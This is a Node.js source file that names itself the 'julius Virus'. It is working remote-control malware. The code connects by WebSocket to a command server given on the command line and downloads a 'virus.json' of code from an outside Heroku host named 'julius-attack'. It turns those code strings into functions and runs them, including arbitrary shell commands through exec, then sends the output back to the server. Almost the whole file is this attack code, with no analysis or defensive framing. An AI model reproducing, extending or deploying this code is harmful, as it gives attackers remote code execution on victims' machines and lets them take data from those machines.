/*
Virus file format:
{
    data:{
        name:"julius Virus",
        version:"1.0.0"
    },
    code:{
    
    }
}
*/

  //const { create } = require("domain");

const fs = require("fs");
const util = require('util');
var exec = require('child_process').exec
var WebSocket = require('websocket').w3cwebsocket;

exec = util.promisify(exec)
  const path = require("path");
  async function update(url,fileName) {
    var updatedVirus = await fetch(url);
    updatedVirus = await updatedVirus.json()
    var currentVirus = JSON.parse(
      fs.readFileSync(path.join(__dirname, fileName), "utf8")
    );
    //console.log(updatedVirus)
    //console.log(currentVirus)
    if(currentVirus == updatedVirus){
    }else{
    	//console.log('update')
    	fs.writeFileSync(path.join(__dirname, fileName), JSON.stringify(updatedVirus));
    }
  }
  async function runCommand(name, prams, updateUrl,fileName) {
  	const asyncFunction = Object.getPrototypeOf(async function(){}).constructor;
    await update(updateUrl,fileName)
    var virus = JSON.parse(
      fs.readFileSync(path.join(__dirname, fileName), "utf8")
    );
    var fnObj = virus.code[name];
    var fn = new asyncFunction(...fnObj.Prams, fnObj.Code);
    //console.log(JSON.stringify(fn))
    //console.log(prams.toString())
    return await fn(...prams);
  }
  function createCommand(fn,fileName) {
    var virus = JSON.parse(
      fs.readFileSync(path.join(__dirname, fileName), "utf8")
    );
    var name = fn.name;
    fn = "" + fn;
    var prams = fn.split("(")[1].split(")")[0].split(",");

    var code = fn
      .split("{")
      [fn.split("{").length - 1].replace("}", "")
      .replaceAll("\n", ""); //.shift().join("").split("}").pop().join("");
    var functionCode = {
      Name: name,
      Code: code,
      Prams: prams,
    };
    virus.code[name] = functionCode;
    fs.writeFileSync(path.join(__dirname,fileName), JSON.stringify(virus));
    //console.log(functionCode);
  }
  async function parseCommand(input,url){
    //data format exec 'ls .' , exec;
    var file = url.split('//')[1].split('/')[1]
    var command = input.split(' ')[0]
    var params = input.split(' ')
    params.shift()
    params = params.join(' ').split(' , ')
    if(command == 'exec'){
      params[1] =exec
    }
    return await runCommand(command,params,url,file)
  }
  async function commandServer(){
    const wss = new WebSocket('ws://'+process.argv[2]+'/');
    //console.log(wss)
    wss.onopen = async ()=>{
      wss.onmessage = async (message) => {
        console.log('message ' +JSON.stringify(message.data))
        var res = await parseCommand(message.data,'https://julius-attack.herokuapp.com/virus.json')
        //console.log(res)
        wss.send(res)
        
      }
    }
   
  }
  //createCommand(async function exec(cmd){
    //const util = require('util');
    //const exec = util.promisify(require('child_process').exec);
    //const { stdout, stderr } = await exec(cmd);
    //return stdout;
  //},'virus.json')
  (async function(){await commandServer()})()
  
	module.exports = {run:runCommand,create:createCommand}


